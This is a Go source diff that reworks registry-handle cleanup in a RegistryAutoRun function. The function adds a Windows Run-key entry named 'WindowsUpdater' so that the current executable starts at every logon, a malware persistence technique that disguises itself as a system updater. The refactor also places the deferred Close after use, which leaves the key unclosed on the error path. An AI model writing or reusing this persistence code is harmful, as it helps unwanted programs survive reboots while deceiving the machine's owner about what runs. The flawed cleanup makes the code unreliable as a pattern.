@@ -6,14 +6,6 @@ import (
 	"os"
 )
 
-func closeRegistry(k registry.Key) error {
-	err := k.Close()
-	if err != nil {
-		return err
-	}
-	return nil
-}
-
 func RegistryAutoRun() error {
 	regPath := `Software\Microsoft\Windows\CurrentVersion\Run`
 
@@ -26,18 +18,17 @@ func RegistryAutoRun() error {
 
 	err = k.SetStringValue(`WindowsUpdater`, `cmd.exe `+os.Args[0])
 	if err != nil {
-		err := closeRegistry(k)
-		if err != nil {
-			return err
-		}
 		return err
 	}
 
-	err = closeRegistry(k)
-	if err != nil {
-		return err
-	}
 	log.Println(`Success! Value added to the registry`)
+
+	defer func(k registry.Key) {
+		err := k.Close()
+		if err != nil {
+			log.Fatal(`Error. Can't close registry'`)
+		}
+	}(k)
 
 	return nil
 }
